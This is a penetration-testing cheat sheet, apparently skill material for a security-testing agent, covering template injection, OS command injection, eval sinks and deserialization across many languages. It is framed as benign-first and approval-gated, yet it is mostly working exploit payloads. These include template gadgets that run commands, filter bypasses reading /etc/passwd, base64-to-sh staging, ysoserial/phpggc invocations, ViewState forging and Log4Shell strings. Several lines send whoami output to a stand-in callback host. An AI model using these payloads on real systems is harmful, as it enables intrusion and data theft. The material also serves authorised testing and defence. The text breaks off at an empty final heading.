# Injection detection + benign-proof payloads (shared by ssti / command-injection / deserialization)
# Confirm with BENIGN proofs (arithmetic, sleep, OOB). NO destructive RCE. Approval-gated for exec.

## SSTI — engine detection via math, then identify
```
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>  ${{7*7}}  @(7*7)  #{7*7}
```
49 (or a template error) = template-evaluated. Then fingerprint:
```
{{7*'7'}}        -> 7777777 = Jinja2/Twig (python/php) ; 49 only = Java (freemarker/velocity)
${7*7}           -> Freemarker/Velocity/Spring EL
#{7*7}           -> Ruby ERB-ish / JSF EL
```
Benign engine-specific proof (NOT RCE): e.g. Jinja2 `{{ config }}`; confirm sandbox vs escape before any exec.

## Command injection — benign confirmation
```
;id            |id            `id`           $(id)          %0aid
; sleep 5      && ping -c1 OOB    | curl http://OOB/
# blind: OOB (DNS/HTTP to collaborator) or timing (sleep). PREFER OOB/sleep over `id` output.
```

## Deserialization — markers + OOB
```
Java:   rO0AB...        (base64 of \xac\xed\x00\x05 serialized header)  — ysoserial gadgets (URLDNS for benign OOB)
PHP:    O:4:"User":...   (serialized object) ; __wakeup/__destruct gadgets
Python: pickle opcodes (c__builtin__\neval...) — DANGEROUS, use a BENIGN OOB gadget only
.NET:   TypeConfuseDelegate / ViewState (__VIEWSTATE) ; ysoserial.net
Node:   __proto__ / serialized function (node-serialize) — OOB marker
```
Confirm deserialization benignly: a **URLDNS-style** gadget that only triggers a DNS/HTTP callback
(no code exec) proves the sink deserializes attacker data. Escalate to a real gadget ONLY with approval.

## OOB
Embed a unique `TOKEN.oob.example` so blind exec/deserialization is attributable. Confirm execution by
the callback (JS/command output or DNS), never by running destructive commands.

---
## SSTI — engine-specific RCE (extended)

### SSTI → RCE by engine (benign proof FIRST: `id` / OOB, not a shell)
```
# Jinja2 (Python) — globals walk to os:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
#   filter-restricted env: build the command without quotes/spaces via request(), or stage a benign
#   base64 payload:  echo <base64>|base64 -d|bash   (reference pattern — use an OOB/`id` proof here)
# Twig (PHP):   {{['id']|filter('system')}}        {{['id']|map('system')|join}}
# Smarty (PHP): {system('id')}      {php}system('id');{/php}   {Smarty_Internal_Write_File::writeFile(...)}
# Freemarker:   <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Velocity:     #set($e=$x.class.forName('java.lang.Runtime')...) (engine-specific gadget)
# Pug/Jade (Node): #{global.process.mainModule.require('child_process').execSync('id')}
# ERB (Ruby):   <%= `id` %>        <%= system('id') %>
```
Tool: `SSTImap -u '<url>' ...` (confirm manually; keep proofs benign). Chain confirmed RCE to the
`command-injection` verifier criteria (OOB/timing, no destructive command).

---
## Extended arsenal — SSTI fingerprint decision matrix

Fire one polyglot, read which delimiter evaluated, then confirm the engine. An error that quotes a
template-engine class name is itself a fingerprint (e.g. `freemarker.`, `jinja2.`, `twig.`, `OgnlException`).
```
# One-shot polyglot (all delimiters at once — a 49 / 7777777 / error narrows the engine):
${7*7}${{7*7}}{{7*7}}<%=7*7%>#{7*7}@(7*7){7*7}[[${7*7}]]#set($x=7*7)$x
```
| probe | result | candidate engine(s) | language |
|---|---|---|---|
| `{{7*7}}` | 49 | Jinja2, Twig, Nunjucks, Pebble, Tornado | Py / PHP / Node / Java |
| `{{7*'7'}}` | 7777777 | Jinja2, Tornado | Python |
| `{{7*'7'}}` | 49 | Twig | PHP |
| `${7*7}` | 49 | Freemarker, Spring-EL, Thymeleaf, Mako, JSP-EL | Java / Python |
| `#{7*7}` | 49 | Slim, JSF-EL, Pug (interp) | Ruby / Java / Node |
| `<%= 7*7 %>` | 49 | ERB, EJS | Ruby / Node |
| `{7*7}` | 49 | Smarty | PHP |
| `@(7*7)` | 49 | Razor | .NET |
| `[[${7*7}]]` | 49 | Thymeleaf | Java |
| `#set($x=7*7)$x` | 49 | Velocity | Java |
| `{{.}}` dumps context, math inert | — | Go text/template, Mustache, Handlebars | Go / Node |

---
## Extended arsenal — SSTI benign eval proof + context read, by engine

Primary proof is pure arithmetic/string (truly benign, can't be confused with reflection). The context
object is read-only info-disclosure — useful but may leak secrets, so REDACT. RCE gadgets are separate below.
| engine (lang) | benign eval proof | benign context read (info-disclosure — redact) |
|---|---|---|
| Jinja2 (Py) | `{{7*7}}` / `{{7*'7'}}` | `{{ self }}` `{{ request }}` `{{ config }}` |
| Mako (Py) | `${7*7}` | `${ self.module }` `${ dir() }` |
| Tornado (Py) | `{{7*7}}` | `{{ handler }}` `{{ locale }}` |
| Twig (PHP) | `{{7*7}}` | `{{ _self }}` `{{ _context }}` `{{ dump() }}` |
| Smarty (PHP) | `{7*7}` | `{$smarty.version}` `{$smarty.server}` |
| Freemarker (Java) | `${7*7}` | `${.data_model}` `${.globals}` |
| Velocity (Java) | `#set($x=7*7)$x` | `$class` `$application` |
| Spring-EL (Java) | `${7*7}` / `#{7*7}` | `#{systemProperties}` `#{T(java.lang.System)}` |
| Thymeleaf (Java) | `[[${7*7}]]` | `[[${#request}]]` `[[${#ctx}]]` |
| Pebble (Java) | `{{7*7}}` | `{{ request }}` |
| ERB (Ruby) | `<%= 7*7 %>` | `<%= self %>` `<%= ENV %>` |
| Slim (Ruby) | `#{7*7}` | `#{ENV}` |
| Liquid (Ruby) | `times` filter math (sandboxed) | `{{ settings }}` — usually info-leak only |
| EJS (Node) | `<%= 7*7 %>` | `<%= Object.keys(this) %>` |
| Nunjucks (Node) | `{{7*7}}` | `{{ self }}` |
| Handlebars (Node) | `{{this}}` (no math) | `{{this}}` |
| Pug/Jade (Node) | `#{7*7}` | `#{Object.keys(global)}` |
| Razor (.NET) | `@(7*7)` | `@Context` `@Html` |
| Go text/template | `{{.}}` (math inert) | `{{ . }}` `{{ printf "%+v" . }}` |

Engine-specific RCE gadgets for engines NOT already covered up top (approval-gated; prove 7*7 / `id` / OOB FIRST):
```
# --- Python ---
# Mako:
<%import os%>${os.popen('id').read()}            ${__import__('os').popen('id').read()}
# Tornado:
{% import os %}{{ os.popen('id').read() }}
# --- Java / Spring ---
# Thymeleaf (inline + preprocessing fragment forms):
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
# Spring-EL (SpEL):
T(java.lang.Runtime).getRuntime().exec('id')     new java.lang.ProcessBuilder({'id'}).start()
# Velocity (classic reflection gadget):
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
# Pebble (method-reflection off a literal, newer versions):
{% set rt=(1).getClass().forName('java.lang.Runtime') %}... getRuntime().exec('id')
# --- Ruby ---
# Slim / Erubi:   #{ `id` }      #{ system('id') }
# Liquid:         sandboxed by default -> usually info-leak only; audit registered filters/tags
# --- Node ---
# EJS:        <%- global.process.mainModule.require('child_process').execSync('id') %>
# Nunjucks:   {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
# Handlebars: prototype/helper gadget resolving require('child_process').execSync('id')  (version-specific)
# --- .NET ---
# Razor:      @{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }
# --- Go ---
# text/template: no arithmetic. Impact = calling a dangerous METHOD exposed on the data object, else info-leak:
{{ .SomeExposedMethod "id" }}        {{ . }}        # html/template auto-escapes OUTPUT (not a sink guard)
```

---
## Extended arsenal — SSTI sandbox + filter bypass (keep to 7*7 / id / OOB)

Jinja2-centric but the ideas (attribute walk, quote-free, space-free, name-from-request) generalize.
```
# Attribute access when '.' or '[]' is filtered:
{{ ''|attr('__class__') }}                               # |attr instead of .__class__
{{ self.__init__.__globals__ }}                           # reach module globals
{{ ''.__class__.__mro__[1].__subclasses__() }}            # walk subclasses to locate os/subprocess (benign enum)
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
# No quotes (pull strings from the request, build chars):
{{ request.args.c }}                                      # command comes from a request arg -> no quotes in template
{{ ()|attr(request.args.a) }}                             # attribute NAME from a request arg
{{ dict(a=1)|join }}                                      # emit chars/strings without quote literals
# No spaces: concatenate with ~, use %0a / + , or push args through request params
{{''|attr(request.args.x)}}
# Blacklist on _ / class / mro: use |attr, hex \x5f for '_', unicode escapes, or request-sourced names
# Whatever the bypass, the BENIGN proof stays the same: resolve to `id` output or an OOB nslookup/curl to TOKEN.oob.example
```

---
## Extended arsenal — OS command injection: separators, substitution, context (sh/bash)

Benign confirmation only — `id`/`whoami`, `sleep` timing, or an OOB DNS/HTTP canary. No shells, no C2.
```
# Inline separators (append to a command the app already runs):
;   &   &&   ||   |   %0a(newline)   %0d   $'\n'
# Command substitution (when input lands INSIDE a command string):
$(id)    `id`    <(id)    >(id)
# Context breakouts (match the quoting around the injection point):
value; id                         # statement terminator
value | id                        # pipe stdout into id
value || id                       # runs only if the first command fails
value && id                       # runs only if the first command succeeds
"value"; id ; echo "              # break out of a double-quoted argument
'value'; id ; echo '              # break out of a single-quoted argument
val%0aid                          # newline injection — extremely common in web params
```
Benign confirmation (choose by egress + noise):
```
; id                              # identity (benign, direct output)
; sleep 5                         # time-based — compare against a 0s baseline
; curl http://TOKEN.oob.example/$(whoami)      # OOB HTTP, marker = whoami (benign)
; nslookup $(whoami).TOKEN.oob.example         # OOB DNS — survives HTTP egress filtering
` ping -c1 TOKEN.oob.example `                  # resolution-triggered DNS lookup
```
| technique | payload | proof |
|---|---|---|
| sleep | `; sleep 5` | response delayed ~5s vs baseline |
| conditional | `; [ $(id -u) = 0 ] && sleep 5` | boolean fact encoded as a delay |
| OOB DNS | `; nslookup x.TOKEN.oob.example` | DNS hit logged at the collaborator |
| OOB HTTP | `; curl http://TOKEN.oob.example/x` | HTTP hit (method/UA/exfil marker) |

---
## Extended arsenal — command injection: argument & filter bypass (bash)
```
# Spaces filtered -> IFS / brace expansion / redirection / tab:
cat</etc/passwd                        # input redirection instead of a space
{cat,/etc/passwd}                      # brace expansion splits args
cat$IFS/etc/passwd                     # $IFS is a space/tab by default
cat$IFS$9/etc/passwd                   # $9 expands to empty, leaving a clean separator
# Slashes filtered -> build "/" from an env var:
echo ${PATH:0:1}                       # first char of PATH == "/"
# Keyword blacklist (id/cat/...) -> quote/escape/concat/glob insertion keeps the exec'd token intact:
w'h'oami    wh\oami    who$@ami    who''ami    $'\x69\x64'      # the last builds "id" from hex
/???/??t  /???/p??s??                  # globbing resolves to /bin/cat  /etc/passwd
a=i;b=d;$a$b                           # assemble "id" from pieces (no literal "id")
# No-exec staging (benign ONLY): the decoded command MUST stay benign (id/whoami), NEVER a shell/reverse shell:
echo aWQK|base64 -d|sh                 # aWQK -> "id"  (reference pattern; keep the payload benign)
# HTTP-layer encoding: url-encode ; & | %0a; double-encode if a WAF strips one layer
```

---
## Extended arsenal — Windows command injection (cmd.exe + PowerShell)
```
# cmd.exe separators:
value & whoami            value && whoami            value | whoami            value || whoami
# cmd substitution-ish (capture output via FOR):
value & for /f %i in ('whoami') do @echo %i
# env-var tricks (obfuscation / char building):
%COMSPEC%                             # resolves to the cmd path
%HOMEPATH:~0,1%                       # slice an env var to build individual chars
# PowerShell:
value; whoami                         value | whoami                         $(whoami)        # subexpression
# PowerShell benign timing / OOB:
; Start-Sleep 5                       # time-based
; Resolve-DnsName x.TOKEN.oob.example # OOB DNS
; nslookup x.TOKEN.oob.example
# Encoded form (obfuscation): powershell -enc <base64-UTF16LE>  -- decoded command MUST stay benign (whoami/sleep)
# Blind timing on Windows: & timeout /t 5   (cmd)   ;Start-Sleep 5 (PS)
```

---
## Extended arsenal — code-injection / eval sinks by language

Each language: the sinks, a benign eval proof, and a DNS/HTTP OOB that proves execution WITHOUT a shell.
```
# ===== PHP =====
# Sinks: eval()  assert()  preg_replace('/x/e',...)  create_function()  call_user_func()
#        system/exec/shell_exec/passthru/popen/proc_open/backticks  include/require(+ data://)
# Benign eval proof:  print(7*7);  -> 49     |  var_dump(7*7)     |  md5(42)
# assert (string arg is eval'd in older PHP):   x' and print(7*7) and '1
# preg_replace /e (deprecated but still seen):  pattern /.*/e  replacement  print(7*7)
# OOB (no shell):  file_get_contents('http://TOKEN.oob.example/'.urlencode(php_uname()));
# include bridge:  ?page=data://text/plain;base64,<b64 of  <?=7*7;?> >      (LFI -> eval)

# ===== Python =====
# Sinks: eval() exec() compile() __import__  str.format/f-string on attacker format  input()(py2)
#        subprocess.*  os.system  pickle.loads  yaml.load(Loader=)/unsafe_load  template render
# Benign proof:  7*7   |   __import__('socket').gethostbyname('TOKEN.oob.example')   # OOB DNS, no shell
# format-string sink (no eval needed):  {0.__class__}  /  {ENV[SECRET]}   -> info-disclosure
# yaml:  !!python/object/apply:socket.gethostbyname ['TOKEN.oob.example']   # DNS-only benign
#        !!python/object/apply:os.system ['id']                             # APPROVAL-GATED

# ===== Node.js =====
# Sinks: eval()  Function()  vm / vm2 (sandbox escape)  child_process.exec/execSync/spawn  require()  setTimeout("str")
# Benign proof:  7*7   |   require('dns').lookup('TOKEN.oob.example',()=>{})     # OOB DNS, no shell
# Function ctor:  Function('return 7*7')()
# vm2 escapes are version-specific (APPROVAL-GATED) -> prove the breach with an OOB DNS only

# ===== Ruby =====
# Sinks: eval/instance_eval/class_eval  send/public_send  system/%x[]/`...`  open('|cmd')  ERB.new(x).result
# Benign proof:  7*7   |   require('resolv'); Resolv.getaddress('TOKEN.oob.example')   # OOB DNS
# open('|id')  and  `id`  are RCE -> APPROVAL-GATED

# ===== Java expression languages =====
# EL (JSP/JSF ${...}):   ${7*7}   ${pageContext}   ${''.getClass().forName('java.lang.Runtime')...}   (appr.-gated)
# OGNL (Struts2 %{...}): %{7*7}   then (memberAccess sandbox bypass) @java.lang.Runtime@getRuntime().exec('id') (appr.-gated)
# SpEL (#{...}/${...}):  T(java.lang.Math).random()   |   T(java.lang.Runtime).getRuntime().exec('id')  (appr.-gated)
# MVEL / JEXL / Groovy(GString):  7*7   ;   "id".execute()  (Groovy, APPROVAL-GATED)
```

---
## Extended arsenal — Java deserialization (benign URLDNS / DNS-only proof FIRST)
```
# Detection markers (any encoding of the stream header bytes AC ED 00 05):
rO0AB...            # base64 of the serialized header
aced0005...         # hex
H4sIA...            # gzip-then-base64 (compressed stream)
Content-Type: application/x-java-serialized-object
# Common carriers: cookies, hidden fields, JSF __VIEWSTATE (javax.faces.ViewState), RMI/JMX, JMS, AMF,
#                  WebLogic T3, Spring HTTP invoker, and Jackson/XStream/Kryo endpoints.
```
Benign confirmation (preferred — no code execution):
```
# URLDNS: a HashMap gadget whose deserialization resolves a URL host via DNS. Pure lookup, zero code exec:
ysoserial URLDNS "http://TOKEN.oob.example/" | base64 -w0          # paste into the sink; DNS hit == vulnerable
# JRMPClient: opens a TCP connection to an attacker host (OOB TCP proof, still no local exec):
ysoserial JRMPClient "HOST:1099" | base64 -w0
```
RCE gadget families (APPROVAL-GATED; run URLDNS first, then stop unless approved). Availability depends on
classpath libraries — pick by the detected dependencies; names below are gadget techniques, not sources:
```
CommonsCollections1-7   CommonsBeanutils1   Spring1/2   Groovy1   Hibernate1/2   ROME   C3P0   Clojure   Jdk7u21
FileUpload1             # file-write only (less dangerous than exec) — still approval-gated
```
JNDI / LDAP injection (Log4Shell-class string sink):
```
${jndi:ldap://TOKEN.oob.example/x}       # proof = LDAP/DNS callback (benign)
${jndi:dns://TOKEN.oob.example/x}        # DNS-only variant
# Remote class-loading -> RCE is APPROVAL-GATED; the callback alone proves reachability.
# Obfuscations seen in the wild: ${${lower:j}ndi:...}   ${${::-j}${::-n}di:...}
# Tools: ysoserial, marshalsec (JNDI/LDAP referral server), gadgetinspector.
```

---
## Extended arsenal — PHP object injection / deserialization
```
# Detection markers:  O:4:"User":2:{...}   a:2:{...}   s:/i:/b: typed fields   base64 of the same in cookies/params
#   error noise: __PHP_Incomplete_Class, "unserialize()" warnings on malformed input.
# Magic methods that fire a POP chain: __wakeup  __destruct  __toString  __call  __get  __set  __invoke
# Benign proof that needs NO code exec: a gadget whose magic method performs an OOB HTTP/SSRF to the canary
#   (SoapClient / Guzzle / Monolog families) -> proves the blob was deserialized without running a shell:
O:10:"SoapClient":3:{...s:8:"location";s:30:"http://TOKEN.oob.example/x";...}    # SSRF-on-deserialize benign proof
# phar:// deserialization (object metadata is auto-unserialized by file ops on a phar):
#   sinks: file_exists / fopen / getimagesize / file_get_contents / is_file(..., 'phar://x.phar/f')
#   upload a benign .phar whose metadata object triggers the OOB/SSRF gadget above.
# Tool: phpggc -l (list chains); phpggc <chain> system id  (RCE chain = APPROVAL-GATED; OOB/SSRF first).
```

---
## Extended arsenal — Python pickle / PyYAML (DANGEROUS — benign OOB only)

`__reduce__` returns `(callable, args)` and is CALLED on load, before any app logic. The benign canary is a
DNS/HTTP lookup, never `os.system`, never a shell, no file/env access.
```
# Markers:  base64 starting gASV / gAR / gAN (proto 2-5)   \x80\x04 header   c__builtin__\neval   cos\nsystem
#           Content-Type application/python-pickle ; .pkl/.joblib model files (torch.load unpickles too)
class P:
    def __reduce__(self):
        import socket
        return (socket.gethostbyname, ("TOKEN.oob.example",))   # OOB DNS proves execution — no shell / no C2
# pickle.dumps(P()) -> feed the sink; a DNS hit at the collaborator == arbitrary-code sink confirmed (benign).
# PyYAML (yaml.load without SafeLoader / unsafe_load):
!!python/object/apply:socket.gethostbyname ['TOKEN.oob.example']    # benign DNS proof
!!python/object/apply:os.system ['id']                             # APPROVAL-GATED
# jsonpickle / dill / numpy allow_pickle=True share the reduce semantics -> same benign DNS proof.
# Audit without loading: fickling / picklescan flag the REDUCE / GLOBAL opcodes (evidence without execution).
```

---
## Extended arsenal — .NET deserialization
```
# Markers:  AAEAAAD/////  (BinaryFormatter base64)   __VIEWSTATE=...   "$type": in JSON (Json.NET)
#           TypeNameHandling   SimpleTypeResolver   System.RuntimeType
# Dangerous formatters / configs:
#   BinaryFormatter, LosFormatter / ObjectStateFormatter (ViewState), SoapFormatter, NetDataContractSerializer,
#   Json.NET TypeNameHandling=Auto/All/Objects, JavaScriptSerializer + SimpleTypeResolver, typed XmlSerializer,
#   DataContractSerializer (known-types), FastJSON, fsPickler.
# ViewState: if __VIEWSTATE lacks a MAC (enableViewStateMac=false) or the machineKey is known -> deserialization.
#   Decode first (viewgen / ysoserial.net --generator) ; a real gadget is APPROVAL-GATED.
# Gadgets (ysoserial.net): TypeConfuseDelegate, ActivitySurrogateSelector, ObjectDataProvider, WindowsIdentity,
#   DataSet, RolePrincipal -- all RCE -> APPROVAL-GATED.
# Benign-first proof: a parse differential / forced type-load error showing the resolver honored an
#   attacker-supplied $type, or an OOB via a URI-typed property -- no gadget executed.
```

---
## Extended arsenal — Node.js / Ruby / other deserialization
```
# ===== Node =====
# node-serialize: a function property containing an IIFE runs on unserialize():
```
```json
{"x":"_$$ND_FUNC$$_function(){require('dns').lookup('TOKEN.oob.example',()=>{})}()"}
```
```
#   benign OOB DNS above; the child_process form is APPROVAL-GATED. Markers: _$$ND_FUNC$$_ , $$ND_FUNC$$
# funcster / serialize-to-js / cryo -- similar function-revival sinks; same benign DNS proof.

# ===== Ruby =====
# Marshal.load  (marker \x04\x08 ; base64 BAg...)   |   YAML.load/Psych  !ruby/object:...   |   Oj.load
# Universal gadget chains exist (technique names only); prove benignly, escalate only with approval.

# ===== Generic deserializer rule =====
# For ANY deserializer: prefer a gadget whose ONLY effect is a DNS/HTTP hit to TOKEN.oob.example.
# A callback proves the attacker-controlled blob was deserialized WITHOUT executing code locally.
```

---
## Extended arsenal — benign-proof & OOB canary cheatsheet (all three classes)

| class | sink seen | first benign proof (no RCE) | escalation (approval-gated) |
|---|---|---|---|
| SSTI | `{{7*7}}` -> 49 | arithmetic / string eval | engine RCE gadget -> `id` / OOB |
| cmd-injection | metachar reflected | `sleep` timing / OOB DNS | `id` / `whoami`, no shell |
| code eval | eval/exec parameter | `7*7` / OOB DNS lookup | language RCE -> `id` / OOB |
| Java deser | `rO0AB` / ViewState | URLDNS DNS callback | gadget chain (classpath-dependent) |
| PHP deser | `O:` / phar | SoapClient SSRF -> OOB | phpggc chain |
| Python pickle | `gASV` / `.pkl` | `__reduce__` -> socket DNS | `os.system` reduce |
| .NET deser | `AAEAAAD` / `$type` | type-resolver differential | ysoserial.net gadget |
| Node deser | `_$$ND_FUNC$$_` | DNS-lookup IIFE | child_process IIFE |

OOB canary construction (attributable per injection point so blind hits map back to a sink):
```
TOKEN=$(openssl rand -hex 4)                       # e.g. 1a2b3c4d -- unique per sink
#  DNS:   ${TOKEN}.oob.example              (survives HTTP egress filtering; read at the authoritative DNS log)
#  HTTP:  http://TOKEN.oob.example/${TOKEN} (richer: captures method / UA / exfil-as-proof)
# Collaborator-style servers (interactsh and the like) capture DNS+HTTP+SMTP; confirm by the TOKEN, not a guess.
# Timing baseline: measure N clean requests, then inject sleep 5 / Start-Sleep 5 ; a clean >4s delta is the proof.
```
```
# Tools (confirm MANUALLY, keep proofs benign): SSTImap, tplmap (SSTI); commix (cmd-injection);
#   ysoserial + marshalsec (Java); ysoserial.net + viewgen (.NET); phpggc (PHP); fickling + picklescan (pickle audit).
```

---
## Extended arsenal — Java gadget-family -> required library (selection table)

URLDNS / JRMPClient prove the sink deserializes (above) with NO gadget library. An RCE gadget only fires if
its backing library is on the target classpath — pick by detected deps, don't spray. (`GadgetProbe` leaks which
classes resolve; grep deps for `*commons*collections*`, `InvokeTransformer`, spring/groovy/rome jars.)
| ysoserial family | required classpath library | effect / note | feasibility |
|---|---|---|---|
| URLDNS | none (pure JDK) | DNS lookup only | detection — always try first |
| JRMPClient / JRMPListener | none (pure JDK RMI) | OOB TCP / RMI connect-back | detection / relay |
| Jdk7u21 | none (JDK <= 7u21) | RCE, no 3rd-party lib | runtime-version-gated |
| CommonsCollections1,3,5,6,7 | commons-collections 3.1 | RCE (InvokeTransformer) | lib-gated (CC6/7 JDK-version-agnostic) |
| CommonsCollections2,4 | commons-collections4 4.0 | RCE | lib-gated |
| CommonsBeanutils1 | commons-beanutils (+collections,+logging) | RCE | lib-gated |
| Spring1 / Spring2 | spring-core+spring-beans / +spring-aop | RCE | lib-gated |
| Groovy1 | groovy 1.7–2.4.3 | RCE | lib+version-gated |
| Hibernate1 / Hibernate2 | hibernate-core | RCE | lib-gated |
| ROME | rome (RSS/Atom) | RCE (ToStringBean -> TemplatesImpl) | lib-gated |
| C3P0 | c3p0 + mchange-commons | remote class-load -> RCE (needs egress) | lib + egress |
| MozillaRhino1/2 | rhino (js.jar) | RCE | lib-gated |
| Clojure / BeanShell1 | clojure / bsh | RCE | lib-gated |
| Vaadin1 / Wicket1 | vaadin-server / wicket-util | RCE | lib-gated |
| Myfaces1/2, JBossInterceptors1, JavassistWeld1 | myfaces / javassist(+jboss/weld) | RCE | lib-gated |
| JSON1 | json-lib + spring/commons mix | RCE | lib-gated |
| FileUpload1 | commons-fileupload | file WRITE only (no exec) | lib-gated |

Non-`ObjectInputStream` Java deserializers share the benign-first rule (OOB callback before any gadget):
```
XMLDecoder.readObject()                      # <java><object class=...> executes on parse
XStream.fromXML()   (<= 1.4.6 default)       # polymorphic type instantiation
SnakeYAML yaml.load (no SafeConstructor)     # !!javax.script.ScriptEngineManager -> marshalsec payloads
Jackson @JsonTypeInfo / enableDefaultTyping  # "@class"/"@type" polymorphic -> gadget bean
Kryo / Hessian / Burlap / readUnshared()     # same readObject-class exposure
```
Audit/decode tools (net-new to the ysoserial+marshalsec line): GadgetProbe + Java-Deserialization-Scanner
(Burp), SerializationDumper (render a stream WITHOUT executing), GadgetInspector (find app-specific chains).

---
## Extended arsenal — .NET formatter x gadget matrix + ViewState signing workflow

Benign-first = a type-resolver differential / URI-typed OOB (above), never a gadget. The matrix maps which
ysoserial.net gadget a given formatter accepts, so you catalogue the *reachable* chain honestly.
| formatter / serializer | fingerprint | gadgets that apply (ysoserial.net) |
|---|---|---|
| BinaryFormatter | `AAEAAAD/////` | TypeConfuseDelegate, TextFormattingRunProperties, DataSet, PSObject, ActivitySurrogateSelector |
| LosFormatter / ObjectStateFormatter (ViewState) | `__VIEWSTATE=` | TypeConfuseDelegate, TextFormattingRunProperties, ActivitySurrogateSelector |
| SoapFormatter / NetDataContractSerializer | SOAP XML / clr-namespace | TypeConfuseDelegate, DataSet, PSObject |
| Json.NET (TypeNameHandling != None) | `"$type":` | ObjectDataProvider (+ExpandedWrapper), WindowsIdentity, RolePrincipal |
| JavaScriptSerializer (+SimpleTypeResolver) | `"__type":` | ObjectDataProvider, WindowsIdentity |
| DataContractSerializer / typed XmlSerializer | `i:type=` | ExpandedWrapper + ObjectDataProvider |
| FastJSON / fsPickler | `"$types"` / binary | type-confusion gadget per lib |

ViewState (`__VIEWSTATE`) exploitation ladder — the first state that holds decides the approach:
```
# 1. MAC disabled (enableViewStateMac=false, legacy):  deserialize directly, no key needed.
# 2. machineKey KNOWN (leaked web.config / default key):  sign (+optionally encrypt) so the server accepts it:
ysoserial.net -p ViewState -g <gadget> -c "<benign>" \
   --generator=<__VIEWSTATEGENERATOR> \
   --validationkey=<hex> --validationalg=SHA256 \
   --decryptionkey=<hex> --decryptionalg=AES         # drop --decryption* when the blob is unencrypted
# 3. machineKey UNKNOWN: offline-recover the key against the signed blob (blacklist3r / viewgen) FIRST.
#    __VIEWSTATEGENERATOR pins the page; a wrong key -> 500 "ViewState MAC failed" (safe signal, NOT a hit).
```
ysoserial.net core flags: `-g/--gadget  -f/--formatter  -c/--command  -o (base64|raw)  -t/--test (run the
chain LOCALLY)  -p/--plugin (ViewState|DotNetNuke|SharePoint|Altserialization|Resx)  --minify  --raf (filter-safe
gadgets only)`. All RCE gadgets APPROVAL-GATED; `-t` proves the chain offline — never fire blind at a target.

---
## Extended arsenal — PHP POP-chain construction + phar structure + framework chains

A POP (property-oriented programming) chain reuses classes ALREADY autoloadable — no new code, just
attacker-chosen property values steering one method call into the next.
```
# Anatomy:
#   KICK-OFF (fires automatically on unserialize, no app call needed):
#     __destruct   (object freed at request end)      __wakeup   (runs right after unserialize)
#     __unserialize(array)  -> TAKES PRECEDENCE over __wakeup when both are defined (PHP 7.4+)
#   PROPAGATION (reached because the kick-off touches a controlled property):
#     __toString  (property used in string context: echo/concat/strval)
#     __call / __get / __set / __invoke  (missing method / property access / object-as-function)
#   SINK: the terminal gadget doing file_put_contents / system / include / SQL.
# Fill EVERY intermediate property in the blob so each magic method lands on the next gadget.
# autoload-as-gadget: a class NAME from the blob hits spl_autoload_register's resolver (underscores->path),
#   so a chosen .php can be required. Revive a "loader" object (pulls a vendor autoloader) BEFORE the gadget
#   object in the same array — objects revive in array order.
```
phar:// deserialization (object injection with NO visible unserialize() call):
```
# ANY filesystem/stream function opening a phar:// path unserializes the archive metadata (PHP < 8.0):
file_exists  fopen  file_get_contents  getimagesize  is_file/is_dir  stat  filemtime  md5_file  copy  unlink  hash_file
# Phar layout:  stub (<?php __HALT_COMPILER(); )  +  manifest  +  SERIALIZED metadata (the gadget obj)  +  signature
#   build with phar.readonly=0, rename to .png/.jpg (prepend GIF89a magic so upload type checks pass), then:
#   ...('phar://uploaded.png/x')     # the metadata object's kick-off magic method fires the chain
```
Benign proof stays the SoapClient/Guzzle SSRF-on-deserialize OOB (above). phpggc weaponizes chains —
APPROVAL-GATED; catalogue only:
```
phpggc -l            # list every chain available for installed-framework classes
phpggc -i <chain>    # show a chain's gadget info / required params
# Chain families seen: Guzzle/FW* (FileCookieJar file-write), Monolog/RCE*, Laravel/RCE*, Symfony/RCE*,
#   Doctrine/*, WordPress/*, Drupal/*, Magento/*, CodeIgniter4/*, Yii2/*, SwiftMailer/*, ThinkPHP/*,
#   Phalcon/*, Slim/*, Dompdf/* .  Categories: RCE / FileWrite / FileDelete / SQLi / Info.
```
Detection note: `unserialize($x, ['allowed_classes'=>false])` (PHP 7+) neutralizes object injection — present
AND on PHP >= 7 (not silently ignored) means objects can't instantiate (markers may still echo = not exploitable).

---
## Extended arsenal — Python YAML tag + loader matrix, pickle opcodes, model files

(DNS-only YAML/pickle probes are above — do NOT re-fire; this is the tag/loader/opcode reference to pick one.)
```
# YAML tag semantics (why each is dangerous):
!!python/object/apply:mod.func [args]   # calls func(*args)              <- benign DNS probe rides this
!!python/object/new:mod.Class [args]    # Class.__new__ (+__setstate__)  <- the post-5.1 FullLoader bypass
!!python/object:mod.Class {state}       # instantiate + set __dict__ / __setstate__
!!python/name:mod.attr                  # resolves a named global (eval/exec/...) for a later apply
!!python/module:mod                     # imports a module
!!python/tuple [..]                     # tuple (benign building block)
```
| loader / API | safe? | note |
|---|---|---|
| `BaseLoader` / `SafeLoader` / `yaml.safe_load` | SAFE | python tags -> ConstructorError (unless app registers a constructor) |
| `FullLoader` / `yaml.full_load` | partial | blocks arbitrary tags now; **5.1–5.3.1 bypass via `object/new`**; default for bare `yaml.load` since 5.1 |
| `UnsafeLoader` / `Loader` / `yaml.unsafe_load` | UNSAFE | full object/function revival = RCE sink |
| bare `yaml.load(x)` (no Loader, < 5.1) | UNSAFE | historic default = full loader |
```
# pickle opcodes an auditor flags WITHOUT executing (fickling / picklescan):
GLOBAL (c)   STACK_GLOBAL (\x93)   REDUCE (R)   INST (i)   OBJ (o)   NEWOBJ (\x81)   BUILD (b)
#   REDUCE + GLOBAL/STACK_GLOBAL pointing at os/subprocess/builtins == the exec primitive.
```
Model-file deserialization (cross-ref `ai-supply-chain`): the load call unpickles BEFORE inference —
```
.pkl .joblib .npy(allow_pickle=True)   torch.load (.pt/.pth/.bin/.ckpt)   keras .h5/.keras (Lambda layer)
# Benign check: scan opcodes (picklescan/fickling) OR load in a sandbox with an OOB-DNS __reduce__ marker.
# Safe-by-design alternative to flag as the fix: safetensors (no code) / torch.load(weights_only=True).
```

---
## Extended arsenal — Ruby Marshal/YAML universal gadget + per-library kick-off

